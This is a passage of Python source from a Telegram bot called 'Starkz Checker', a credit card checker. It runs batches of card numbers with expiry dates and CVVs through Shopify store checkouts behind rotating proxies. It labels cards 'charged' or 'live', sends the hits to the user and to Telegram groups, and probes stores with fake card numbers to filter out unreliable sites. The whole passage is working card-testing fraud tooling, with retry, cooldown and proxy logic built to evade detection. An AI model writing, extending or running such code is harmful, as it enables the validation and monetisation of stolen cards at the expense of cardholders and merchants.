    live_list    = session.get('live_cards', [])
    dead_list    = session.get('dead_cards', [])
    error_list   = session.get('error_cards', [])

    total   = session.get('total', 0)
    checked = session.get('checked', 0)

    if result_type == "charged":
        cards_to_show = [("💎", c.get('card', 'N/A')) for c in charged_list]
        file_prefix   = "CHARGED"
    elif result_type == "live":
        cards_to_show = [("🔥", c.get('card', 'N/A')) for c in live_list]
        file_prefix   = "LIVE"
    elif result_type == "dead":
        cards_to_show = [("❌", c.get('card', 'N/A')) for c in dead_list]
        file_prefix   = "DEAD"
    else:
        cards_to_show = (
            [("💎", c.get('card', 'N/A')) for c in charged_list]
            + [("🔥", c.get('card', 'N/A')) for c in live_list]
        )
        file_prefix = "HITS"

    total_count = len(cards_to_show)

    lines = []
    lines.append("⚡️ 𝐒𝐓𝐀𝐑𝐊𝐙 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️")
    lines.append("")
    lines.append("⚡ 𝐑𝐞𝐬𝐮𝐥𝐭𝐬")
    lines.append(f"💳 Total: {total}")
    lines.append(f"📊 Checked: {checked}/{total}")
    lines.append(f"🤍 Charged: {len(charged_list)}")
    lines.append(f"😀 Live: {len(live_list)}")
    lines.append(f"🧩 Captcha: 0")
    lines.append(f"⚠️ Dead: {len(dead_list)}")
    lines.append("")
    lines.append("🛒 Gateway: Shopify Payments")
    lines.append("")
    lines.append("🎯 𝐇𝐢𝐭𝐬")

    if not cards_to_show:
        lines.append("⚠️ No hits in this category")
    else:
        for emoji, cc in cards_to_show:
            lines.append(f"{emoji} {cc}")

    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("🤖 Bot By: Starkz (https://t.me/oozaruh)")

    content = "\n".join(lines)
    content = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', content, flags=re.DOTALL)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"STARKZ_{file_prefix}_{timestamp}.txt"
    return file_buffer, filename, total_count


async def _post_hits_summary(bot: Bot, session_id: str):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return
    if session.get('status') != "FINISHED":
        return
    if session.get('_summary_posted'):
        return

    charged_list = session.get('charged_cards', [])
    live_list    = session.get('live_cards', [])
    dead_count   = len(session.get('dead_cards', []))
    total        = session.get('total', 0)
    checked      = session.get('checked', 0)

    if not charged_list and not live_list:
        session['_summary_posted'] = True
        return

    def E(name, eid):
        return f'<tg-emoji emoji-id="{eid}">{name}</tg-emoji>'

    header = (
        f"{E('⚡️', HIT_BOLT_EMOJI_ID)} <b>𝗦𝗧𝗔𝗥𝗞𝗭 𝗖𝗛𝗘𝗖𝗞𝗘𝗥</b> {E('⚡️', HIT_BOLT_EMOJI_ID)}\n"
        f"\n"
        f"{E('⚡', HIT_BOLT_EMOJI_ID)} <b>𝗥𝗲𝘀𝘂𝗹𝘁𝘀</b>\n"
        f"{E('💳', HIT_CARD_EMOJI_ID)} Total: <b>{total}</b>\n"
        f"{E('📊', HIT_CHART_EMOJI_ID)} Checked: <b>{checked}/{total}</b>\n"
        f"{E('💎', HIT_CHARGED_EMOJI_ID)} Charged: <b>{len(charged_list)}</b>\n"
        f"{E('✅', CUSTOM_APPROVED_EMOJI_ID)} Live: <b>{len(live_list)}</b>\n"
        f"{E('🚫', HIT_BLOCKED_EMOJI_ID)} Captcha: <b>0</b>\n"
        f"{E('⚠️', HIT_WARNING_EMOJI_ID)} Dead: <b>{dead_count}</b>\n"
        f"\n"
        f"{E('🌐', HIT_GATE_EMOJI_ID)} Gateway: <b>Shopify Payments</b>\n"
        f"\n"
        f"{E('🔥', HIT_FIRE_EMOJI_ID)} <b>𝗛𝗶𝘁𝘀</b>\n"
    )

    footer = (
        f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E('🐈‍⬛', HIT_DEV_EMOJI_ID)} Bot By: <a href='https://t.me/oozaruh'>Starkz</a>"
    )

    hit_lines = []
    for c in charged_list:
        hit_lines.append(f"{E('💎', HIT_CHARGED_EMOJI_ID)} <code>{html_escape(c.get('card', 'N/A'))}</code>")
    for c in live_list:
        hit_lines.append(f"{E('🔥', HIT_FIRE_EMOJI_ID)} <code>{html_escape(c.get('card', 'N/A'))}</code>")

    budget = 3800 - len(header) - len(footer)
    included, used = [], 0
    for line in hit_lines:
        if used + len(line) + 1 > budget:
            break
        included.append(line)
        used += len(line) + 1

    remaining = len(hit_lines) - len(included)
    if remaining > 0:
        included.append(f"<i>... and {remaining} more — tap a button below for the full file</i>")

    text = header + "\n".join(included) + footer

    for attempt in range(3):
        try:
            await safe_send_message(
                bot, chat_id=session['chat_id'], text=text,
                parse_mode="HTML",
                reply_markup=get_result_buttons(session_id, is_running=False),
            )
            session['_summary_posted'] = True
            return
        except Exception as e:
            logging.warning(f"[MSH] Summary post failed (attempt {attempt+1}/3): {e}")
            if attempt < 2:
                await asyncio.sleep(2)


async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, bin_data, user_obj, plan_name, proxy_status_formatted, price, site="Unknown Site", hit_type="CHARGED"):
    user_link = build_user_link(user_obj)
    safe_response = html_escape(str(response_msg))
    user_display = f"{user_link} ({plan_name})"

    if hit_type == "CHARGED":
        status_line = f'Charged <tg-emoji emoji-id="{HIT_CHARGED_EMOJI_ID}">💎</tg-emoji>'
    else:
        status_line = f'Approved <tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'

    caption = (
        f"[𐓷] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status_line}\n"
        f"[𐓷] 𝗚𝗮𝘁𝗲 : Shopify [{html_escape(str(price))}$]\n"
        f"[𐓷] 𝗥𝗲𝘀𝗽 : {safe_response}\n"
        f"[𐓷] 𝗨𝘀𝗲𝗿 : {user_display} <tg-emoji emoji-id=\"{HIT_USER_EMOJI_ID}\">👤</tg-emoji>"
    )

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="STARKZ", url="https://t.me/StarkzchkBot",
                             icon_custom_emoji_id="5042097984083330584", style="primary")]
    ])

    await _safe_send_animation_or_text(bot, chat_id=HIT_LOG_GROUP_ID, caption=caption,
                                       gif_url=None, reply_markup=reply_markup)


async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, send_to_extra: bool = True):
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape(f"Shopify {api_price} USD")
    safe_response = html_escape(str(response_msg))
    safe_proxy = str(proxy_status_formatted)
    gif_url = await get_anime_gif()
    user_link = build_user_link(user_obj)
    dev_link = '<a href="https://t.me/oozaruh">Starkz</a>'
    user_display = f"{user_link} ({plan_name})"
    caption = (
        f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>\n"
        f"<tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗮𝗿𝗱 ➛ <code>{html_escape(cc_formatted)}</code>\n"
        f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ <b>{gateway_display}</b>\n"
        f"<tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{safe_response}</b>\n"
        f"<tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗕𝗿𝗮𝗻𝗱 ➛ <b>{bin_scheme}</b>\n"
        f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_bank}</b>\n"
        f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_country}</b>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / <tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
    )
    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="STARKZ", url="https://t.me/StarkzchkBot",
                             icon_custom_emoji_id="5042097984083330584", style="primary")]
    ])
    try:
        await _safe_send_animation_or_text(bot, chat_id=user_obj.id, caption=caption,
                                           gif_url=gif_url, reply_markup=reply_markup)
    except TelegramForbiddenError as e:
        logging.warning(f"[MSH] Could not DM approved: {e}")
    if not send_to_extra:
        return
    for target_chat in EXTRA_CHARGED_GROUP_IDS:
        await _safe_send_animation_or_text(bot, chat_id=target_chat, caption=caption,
                                           gif_url=gif_url, reply_markup=reply_markup)


async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name) -> bool:
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape(f"Shopify {api_price} USD")
    safe_response = html_escape(str(response_msg))
    safe_proxy = str(proxy_status_formatted)
    gif_url = await get_anime_gif()
    user_link = build_user_link(user_obj)
    dev_link = '<a href="https://t.me/oozaruh">Starkz</a>'
    user_display = f"{user_link} ({plan_name})"
    caption = (
        f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji>\n"
        f"<tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗮𝗿𝗱 ➛ <code>{html_escape(cc_formatted)}</code>\n"
        f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ <b>{gateway_display}</b>\n"
        f"<tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{safe_response}</b>\n"
        f"<tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗕𝗿𝗮𝗻𝗱 ➛ <b>{bin_scheme}</b>\n"
        f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_bank}</b>\n"
        f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_country}</b>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / <tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
    )
    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Starkz", url="https://t.me/StarkzchkBot",
                             icon_custom_emoji_id="5042097984083330584", style="primary")]
    ])
    try:
        await _safe_send_animation_or_text(bot, chat_id=user_obj.id, caption=caption,
                                           gif_url=gif_url, reply_markup=reply_markup)
    except TelegramForbiddenError as e:
        logging.warning(f"[MSH] Could not DM charged: {e}")
    sent_to_extra = False
    for target_chat in EXTRA_CHARGED_GROUP_IDS:
        ok = await _safe_send_animation_or_text(bot, chat_id=target_chat, caption=caption,
                                                gif_url=gif_url, reply_markup=reply_markup)
        if ok:
            sent_to_extra = True
    return sent_to_extra


def get_result_buttons(session_id: str, is_running: bool = True) -> InlineKeyboardMarkup:
    session = MSH_SESSIONS.get(session_id, {})
    approved_count = session.get('approved', 0)
    dead_count = session.get('dead', 0)
    charged_count = session.get('charged', 0)
    all_count = (
        len(session.get('charged_cards', []))
        + len(session.get('live_cards', []))
    )
    buttons = [
        [
            InlineKeyboardButton(
                text=f"Lɪᴠᴇ ({approved_count})",
                callback_data=MshResultCallback(session_id=session_id, result_type="live").pack(),
                style="success", icon_custom_emoji_id=BTN_LIVE_EMOJI_ID
            ),
            InlineKeyboardButton(
                text=f"Dᴇᴀᴅ ({dead_count})",
                callback_data=MshResultCallback(session_id=session_id, result_type="dead").pack(),
                style="danger", icon_custom_emoji_id=BTN_DEAD_EMOJI_ID
            )
        ],
        [
            InlineKeyboardButton(
                text=f"Cʜ𝗮𝗿𝗴𝗲𝗱 ({charged_count})",
                callback_data=MshResultCallback(session_id=session_id, result_type="charged").pack(),
                style="primary", icon_custom_emoji_id=BTN_CHARGED_EMOJI_ID
            ),
            InlineKeyboardButton(
                text=f"Hɪᴛs ({all_count})",
                callback_data=MshResultCallback(session_id=session_id, result_type="all").pack(),
                icon_custom_emoji_id=BTN_ALL_EMOJI_ID
            )
        ]
    ]
    if is_running:
        buttons.append([
            InlineKeyboardButton(
                text="Sᴛᴏ𝗽 Cʜ𝗲𝗰𝗸𝗶𝗻𝗴",
                callback_data=MshStopCallback(session_id=session_id).pack(),
                style="danger", icon_custom_emoji_id=BTN_STOP_EMOJI_ID
            )
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


async def update_progress_message(bot: Bot, session_id):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return
    current_time = time.time()
    last_update = session.get('last_update_time', 0)
    is_finished = session['status'] == "FINISHED"
    is_stopped = session['status'] == "STOPPED"
    if not is_finished and not is_stopped and (current_time - last_update) < 3.5:
        return
    elapsed = current_time - session['start_time']
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
    status_icon = ("<tg-emoji emoji-id='5269531045165816230'>🔄</tg-emoji>" if session['status'] == "CHECKING"
                   else (f"<tg-emoji emoji-id=\"{BTN_STOP_EMOJI_ID}\">🛑</tg-emoji>" if session['status'] == "STOPPED"
                         else "<tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji>"))
    status_text = session['status']
    if status_text == "CHECKING": status_text = f"<i>{status_text}</i>"
    elif status_text in ("STOPPED", "FINISHED"): status_text = f"<b>{status_text}</b>"
    text = (
        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n"
        f"<b><tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> {status_text} {status_icon}\n"
        f"<b><tg-emoji emoji-id='5388632425314140043'>🔍</tg-emoji> 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➛</b> <code>{session['checked']}/{session['total']}</code>\n"
        f"<b><tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➛</b> <b>{session['approved']}</b>\n"
        f"<b><tg-emoji emoji-id='5436113877181941026'>🔥</tg-emoji> 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ➛</b> <b>{session['charged']}</b>\n"
        f"<b><tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> 𝗗𝗲𝗮𝗱 ➛</b> <b>{session['dead']}</b>\n"
        f"<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>{session['errors']}</b>\n"
        f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <b>{elapsed_str}</b>\n"
        f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/oozaruh'>Starkz</a>\n"
        f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
    )
    if session.get('last_text') == text:
        return
    if session_id not in SESSION_LOCKS:
        SESSION_LOCKS[session_id] = asyncio.Lock()
    async with SESSION_LOCKS[session_id]:
        if session.get('last_text') == text:
            return
        reply_markup = get_result_buttons(session_id, is_running=(session['status'] == "CHECKING"))
        try:
            await bot.edit_message_text(
                chat_id=session['chat_id'], message_id=session['msg_id'],
                text=text, parse_mode="HTML", reply_markup=reply_markup
            )
            session['last_text'] = text
            session['last_update_time'] = current_time
        except TelegramBadRequest as e:
            err = str(e).lower()
            if "message is not modified" not in err and "message to edit not found" not in err:
                logging.error(f"Error updating progress: {e}")
        except Exception as e:
            logging.error(f"Error updating progress: {e}")


async def _background_progress_updater(bot: Bot, session_id: str):
    while True:
        session = MSH_SESSIONS.get(session_id)
        if not session:
            return
        if session['status'] in ("FINISHED", "STOPPED"):
            session['last_update_time'] = 0
            try:
                await update_progress_message(bot, session_id)
            except Exception:
                pass
            return
        await asyncio.sleep(3.0)
        session = MSH_SESSIONS.get(session_id)
        if not session:
            return
        session['last_update_time'] = 0
        try:
            if session.get('current_round', 0) > 0:
                await _update_retry_banner(
                    bot, session_id,
                    session['current_round'],
                    session.get('retry_total', 0),
                    0, phase="running",
                )
            else:
                await update_progress_message(bot, session_id)
        except Exception as e:
            logging.debug(f"[MSH] bg updater error: {e}")


async def _update_retry_banner(bot: Bot, session_id, round_num, retry_total, delay, phase="waiting"):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return
    elapsed = round(time.time() - session['start_time'], 1)
    headline = (f"<i>WAITING {delay}s BEFORE RETRY {round_num}/{MAX_OUTER_ROUNDS}</i>"
                if phase == "waiting" else
                f"<i>RETRYING ROUND {round_num}/{MAX_OUTER_ROUNDS}</i>")
    text = (
        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n"
        f"<b><tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> {headline}\n"
        f"<b><tg-emoji emoji-id='4915853119839011973'>🔁</tg-emoji> 𝗥𝗲𝘁𝗿𝘆𝗶𝗻𝗴 ➛</b> <code>{retry_total}</code> cards\n"
        f"<b><tg-emoji emoji-id='5388632425314140043'>🔍</tg-emoji> 𝗥𝗼𝘂𝗻𝗱 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ➛</b> <code>{session.get('retry_checked', 0)}/{retry_total}</code>\n"
        f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲 ➛</b> <b>{elapsed}s</b>\n"
        f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 ➛</b> <code>{session_id}</code>"
    )
    try:
        await bot.edit_message_text(
            chat_id=session['chat_id'], message_id=session['msg_id'],
            text=text, parse_mode="HTML",
            reply_markup=get_result_buttons(session_id, is_running=True),
        )
        session['last_text'] = ""
    except Exception:
        pass


async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name,
                              is_retry: bool = False):
    session = MSH_SESSIONS.get(session_id)
    if not session or is_session_stopped(session_id):
        return

    sites_list = session.get('sites_list') or get_sites()
    if not sites_list:
        logging.error(f"[MSH] sites.txt is empty — no sites available for session {session_id}")
        session['errors'] += 1
        if is_retry:
            session['retry_checked'] = session.get('retry_checked', 0) + 1
        else:
            session['checked'] += 1
        return

    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        logging.error(f"[MSH] No proxy manager for session {session_id}")
        session['errors'] += 1
        if is_retry:
            session['retry_checked'] = session.get('retry_checked', 0) + 1
        else:
            session['checked'] += 1
        return

    result_status = "ERROR"
    response_msg = "Unknown Error"
    api_price = "0.00"
    proxy_status_formatted = "Unknown 🔴"
    bin_data = {}
    used_proxy = None
    used_site = None
    is_insufficient = False

    proxy_fails         = 0
    site_fails          = 0
    no_product_hits     = 0
    no_seller_hits      = 0          # PATCH P2
    pool_exhausted_hits = 0
    saturation_waits    = 0
    api_backoff_waits   = 0
    proxy_fail_codes: list[str] = []

    parts = cc_formatted.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2: yy = "20" + yy

    if is_session_stopped(session_id):
        return

    _bin_task = asyncio.create_task(_safe_bin_lookup(cc_num[:6]))

    try:
        while True:
            if is_session_stopped(session_id):
                return

            if proxy_fails >= MAX_PROXY_RETRIES:
                result_status = "ERROR"
                code_summary = "/".join(sorted(set(proxy_fail_codes))) or "unknown"
                response_msg = (
                    f"All proxies exhausted ({proxy_fails} errors: {code_summary})"
                )
                break
            if site_fails >= MAX_SITE_RETRIES:
                result_status = "ERROR"
                response_msg = f"All sites exhausted ({site_fails} site errors)"
                break
            if no_seller_hits >= MAX_NO_SELLER_HITS:
                result_status = "ERROR"
                response_msg = f"All sites address-rejected ({no_seller_hits} attempts)"
                break
            if saturation_waits >= MAX_SATURATION_WAITS:
                result_status = "ERROR"
                response_msg = f"Site pool saturated ({saturation_waits} waits)"
                break
            if api_backoff_waits >= MAX_API_BACKOFF_WAITS:
                result_status = "ERROR"
                response_msg = (
                    f"API_REPLICAS_UNREACHABLE — API overloaded, "
                    f"{api_backoff_waits} backoffs exhausted"
                )
                break
            if no_product_hits >= len(sites_list):
                result_status = "SKIPPED"
                response_msg = "No sites with products available"
                break

            proxy_result = proxy_manager.get_next_proxy()
            if not proxy_result or proxy_result[0] is None:
                result_status = "ERROR"
                response_msg = "No proxies configured"
                break
            proxy = proxy_result[0]
            if proxy == _ALL_COOLED_SENTINEL:
                await asyncio.sleep(5)
                continue
            used_proxy = proxy

            if is_session_stopped(session_id):
                return

            last_cleanup = session.get('_last_cleanup_count', 0)
            if session['checked'] - last_cleanup >= 100:
                _cleanup_site_cooldowns(session)
                session['_last_cleanup_count'] = session['checked']

            available = [
                s for s in sites_list
                if s not in GLOBAL_BLACKLISTED_SITES and _site_available(s, session)
            ]

            if not available:
                _cleanup_site_cooldowns(session)
                await asyncio.sleep(2.0)
                available = [
                    s for s in sites_list
                    if s not in GLOBAL_BLACKLISTED_SITES and _site_available(s, session)
                ]
                if not available:
                    available = [s for s in sites_list if s not in GLOBAL_BLACKLISTED_SITES]
                    if not available:
                        result_status = "SKIPPED"
                        response_msg = "All sites permanently blacklisted"
                        break

            site = random.choice(available)
            used_site = site

            pool_minus = [s for s in available if s != site]
            random.shuffle(pool_minus)
            fallback_sites = pool_minus[:MAX_FALLBACKS]

            _site_sems = session.setdefault("_site_sems", {})
            if site not in _site_sems:
                _site_sems[site] = asyncio.Semaphore(SITE_CONCURRENCY_LIMIT)
            _site_sem = _site_sems[site]
            _entered = False
            try:
                await asyncio.wait_for(_site_sem.acquire(), timeout=1.5)
                _entered = True
            except asyncio.TimeoutError:
                saturation_waits += 1
                session.setdefault('_blacklisted_sites', {})[site] = (
                    time.time() + 15
                )
                logging.debug(
                    f"[MSH] Site {site} saturated — rotating "
                    f"(waits={saturation_waits}/{MAX_SATURATION_WAITS})"
                )
                await asyncio.sleep(random.uniform(0.2, 0.8))
                continue

            try:
                success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
                    cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy,
                    fallback_sites=fallback_sites,
                )
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logging.error(f"[MSH] Exception for {cc_formatted} on {site}: {type(e).__name__}: {e}")
                proxy_fails += 1
                await asyncio.sleep(0.1)
                continue
            finally:
                if _entered:
                    _site_sem.release()

            if is_session_stopped(session_id):
                return

            if message is None:
                message = "Unknown Error"
            if not isinstance(message, str):
                message = str(message)

            if "live" in str(proxy_status_raw).lower():
                proxy_status_formatted = "Live <tg-emoji emoji-id='5039793437776282663'>🟢</tg-emoji>"
            else:
                proxy_status_formatted = "Dead 🔴"

            api_price = price
            proxy_manager.report_result(proxy, message, http_status)

            code = _extract_code(message)

            if code in POOL_EXHAUSTED_CODES:
                logging.debug(
                    f"[MSH] SITES_EXHAUSTED for {cc_formatted} on site={site} "
                    f"(available={len(available)}, pool_hit={pool_exhausted_hits}/"
                    f"{POOL_EXHAUSTED_MAX_INNER}). msg={message[:200]}"
                )
                session.setdefault('_blacklisted_sites', {})[site] = (
                    time.time() + SITE_COOLDOWN_TTL
                )
                if pool_exhausted_hits < POOL_EXHAUSTED_MAX_INNER:
                    pool_exhausted_hits += 1
                    _cleanup_site_cooldowns(session)
                    await asyncio.sleep(POOL_EXHAUSTED_INNER_DELAY)
                    continue
                result_status = "ERROR"
                response_msg = f"Sites exhausted: {message[:100]}"
                break

            if code in SKIP_SITE_CODES:
                session.setdefault('_no_product_sites', {})[site] = (
                    time.time() + SITE_COOLDOWN_TTL
                )
                no_product_hits += 1
                logging.debug(
                    f"[MSH] Site {site} rejected ({code}) — "
                    f"cooling down {SITE_COOLDOWN_TTL}s "
                    f"({no_product_hits}/{len(sites_list)})"
                )
                await asyncio.sleep(0.05)
                continue

            if code == "API_REPLICAS_UNREACHABLE":
                api_backoff_waits += 1
                backoff = API_BACKOFF_BASE * (2 ** (api_backoff_waits - 1)) \
                          + random.uniform(0, 1.0)
                logging.debug(
                    f"[MSH] API slow for {cc_formatted} — backing off "
                    f"{backoff:.1f}s (waits={api_backoff_waits}/"
                    f"{MAX_API_BACKOFF_WAITS}): {message[:80]}"
                )
                await asyncio.sleep(backoff)
                continue

            # ─── PATCH P1: mirror api.py's cooldown locally ───
            # If the API says "dead/in cooldown" that means the API's OWN
            # proxy pool has this proxy marked. That is not a fresh failure
            # and msh.py must not charge a retry — but we DO have to mark
            # it here or get_next_proxy() keeps returning it forever and
            # the card spins in an infinite rotate loop. A short fixed
            # 30s local cooldown is enough; when it expires we try again
            # and either api.py has also recovered it, or we mirror again.
            if code in PROXY_ERROR_CODES:
                if "dead/in cooldown" in message.lower():
                    proxy_manager.mirror_api_cooldown(proxy)
                    logging.debug(
                        f"[MSH] Proxy {mask_proxy(proxy)} cooling on API — "
                        f"local {API_COOLDOWN_MIRROR_SECONDS}s cooldown "
                        f"(no retry charged)"
                    )
                    await asyncio.sleep(0.05)
                    continue

                proxy_fails += 1
                proxy_fail_codes.append(code)
                logging.debug(
                    f"[MSH] Proxy error for {cc_formatted} — rotating "
                    f"({proxy_fails}/{MAX_PROXY_RETRIES}): code={code} msg={message[:80]}"
                )
                await asyncio.sleep(0.1)
                continue

            # ─── PATCH P2: NO_SELLER_PROPOSAL gets its own budget ───
            # ~40% of Shopify stores reject the test address for shipping.
            # That's not a site failure — it's an address mismatch. Give
            # it a separate 50-attempt budget instead of sharing the
            # 8-attempt site-fails budget, or cards die purely from
            # address mismatch on roughly 1-in-160 runs.
            if code in SITE_ERROR_CODES:
                if code == "NO_SELLER_PROPOSAL":
                    no_seller_hits += 1
                    if no_seller_hits >= MAX_NO_SELLER_HITS:
                        result_status = "ERROR"
                        response_msg = (
                            f"All sites address-rejected "
                            f"({no_seller_hits} attempts)"
                        )
                        break
                    session.setdefault('_blacklisted_sites', {})[site] = (
                        time.time() + SITE_COOLDOWN_TTL
                    )
                    logging.debug(
                        f"[MSH] Site {site} address-rejected (NO_SELLER_PROPOSAL) — "
                        f"cool {SITE_COOLDOWN_TTL}s, no retry "
                        f"({no_seller_hits}/{MAX_NO_SELLER_HITS})"
                    )
                    await asyncio.sleep(0.05)
                    continue

                site_fails += 1
                session.setdefault('_blacklisted_sites', {})[site] = (
                    time.time() + SITE_COOLDOWN_TTL
                )
                logging.debug(
                    f"[MSH] Site error for {cc_formatted} on {site} — "
                    f"cooling down {SITE_COOLDOWN_TTL}s "
                    f"({site_fails}/{MAX_SITE_RETRIES}): {message[:60]}"
                )
                await asyncio.sleep(0.05)
                continue

            if code in CHARGED_CODES or "ORDER_PLACED" in message.upper():
                logging.info(f"[MSH] Potential CHARGED on {site} — running fake-card verification")

                FAKE_CARDS = [
                    {"cc": "4003035140199121", "mes": "11", "ano": "2029", "cvv": "470"},
                    {"cc": "4400666318254873", "mes": "03", "ano": "2027", "cvv": "336"},
                    {"cc": "4921811566378291", "mes": "08", "ano": "2028", "cvv": "999"},
                    {"cc": "4226738291029281", "mes": "12", "ano": "2030", "cvv": "001"}
                ]

                async def _verify_fake(fake_card):
                    try:
                        _, fmsg, _, _, _, _, _, _ = await process_card_api(
                            cc=fake_card["cc"], mes=fake_card["mes"],
                            ano=fake_card["ano"], cvv=fake_card["cvv"],
                            site=site, proxy=proxy,
                        )
                        if fmsg is None:
                            return False
                        fmsg_up = str(fmsg).upper()
                        return any(k in fmsg_up for k in
                                   ["ORDER_PLACED", "CHARGED", "THANK YOU", "SUCCESS", "PAID", "APPROVED"])
                    except Exception:
                        return False

                fake_results = await asyncio.gather(*[_verify_fake(fc) for fc in FAKE_CARDS],
                                                     return_exceptions=True)
                fake_charged = sum(1 for r in fake_results if r is True)

                if fake_charged >= 1:
                    session.setdefault('_blacklisted_sites', {})[site] = (
                        time.time() + SITE_COOLDOWN_TTL
                    )
